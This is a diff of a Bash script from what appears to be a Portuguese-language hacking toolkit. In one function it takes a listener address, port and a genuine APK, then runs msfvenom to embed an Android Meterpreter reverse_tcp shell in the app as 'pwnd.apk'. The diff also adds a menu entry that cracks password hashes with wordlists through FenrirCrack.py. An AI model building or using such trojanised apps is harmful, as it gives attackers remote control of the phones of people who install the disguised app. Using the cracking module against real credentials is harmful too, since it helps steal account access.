@@ -1257,11 +1257,13 @@ tc_payload() {
 					read lport
 					printf "${verde}Informe o caminho do apk real: ${normalbold}"
 					read apk
+					stty -echo
 					echo -e "${azulbold}\nAplicativo sendo modificado, aguarde...\n${normal}"
 					SILENTJAVAOPTIONS="$JAVA_OPTIONS"
 					unset JAVAOPTIONS
 					alias='java "$SILENTJAVA_OPTIONS"'
 					msfvenom -x $apk -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o  $TCPayloads/pwnd.apk &> /dev/null
+					stty echo
 					ver=$(ls $TCPayloads | grep pwnd.apk | wc -l)
 					if [ "$ver" == 0 ]
 					then
@@ -1326,3 +1328,19 @@ tc_payload() {
 
 }
 
+tc_fenrircrack() {
+	echo -e "${cinza}Este modulo faz a quebra de hashes utilizando wordlists."
+	echo
+	python $TCScripts/FenrirCrack.py
+	echo -e "\n"
+	printf "${verdebold}\n\nDeseja efetuar uma nova quebra? [s/n]: ${normalbold}"
+        read opcao
+        if [ "$opcao" == "s" ]
+        then
+                tc_fenrircrack
+        else
+                exec $1
+        fi
+
+
+}
